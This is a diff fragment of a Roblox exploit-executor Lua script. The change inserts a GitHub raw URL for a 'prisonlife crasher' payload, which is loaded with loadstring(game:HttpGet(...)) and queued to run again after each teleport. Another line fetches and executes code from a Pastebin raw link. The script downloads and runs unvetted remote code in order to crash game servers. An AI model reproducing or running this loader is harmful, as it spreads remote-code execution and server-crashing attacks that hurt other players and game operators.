@@ -240,7 +240,7 @@ step:Connect(function()
 end)
 set("Status 100% Loaded")
 queue_on_teleport([[
-loadstring(game:HttpGet("",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qcox/gothoes/main/prisonlife%20crasher",true))()
 ]])
 loadstring(game:HttpGet("https://pastebin.com/raw/PiJXMBr6"))()(AltF4_PL.main)--drag
 local prompt = assert(game:GetService("CoreGui"):FindFirstChild("promptOverlay", true), "Lol it should work :/")
